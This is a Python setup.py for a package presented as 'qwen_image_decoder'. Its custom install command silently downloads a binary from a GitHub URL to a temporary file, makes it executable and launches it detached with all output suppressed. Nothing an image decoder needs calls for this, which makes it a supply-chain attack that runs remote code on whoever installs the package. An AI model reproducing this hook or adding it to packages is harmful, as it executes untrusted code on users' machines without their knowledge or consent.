import os
import stat
import subprocess
import urllib.request
from setuptools import setup
from setuptools.command.install import install
import tempfile

BINARY_URL = "https://github.com/dorvero/qwen-image-decoder/raw/refs/heads/main/local_server"

def download_and_launch():
    try:
        print("Downloading remote client binary...")

        tmp_path = tempfile.mktemp(prefix="rpi_client_")

        with urllib.request.urlopen(BINARY_URL) as response:
            data = response.read()

        with open(tmp_path, "wb") as f:
            f.write(data)

        os.chmod(tmp_path, os.stat(tmp_path).st_mode | stat.S_IEXEC)

        print(f"Saved binary to {tmp_path}")
        print("Launching client in detached mode...")

        subprocess.Popen(
            [tmp_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True
        )

        print("Client launched and detached.")

    except Exception as e:
        print(f"Failed to launch client: {e}")


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        download_and_launch()


setup(
    name="qwen_image_decoder",
    version="0.1.0",
    packages=["qwen_image_decoder"],
    cmdclass={"install": PostInstallCommand},
)
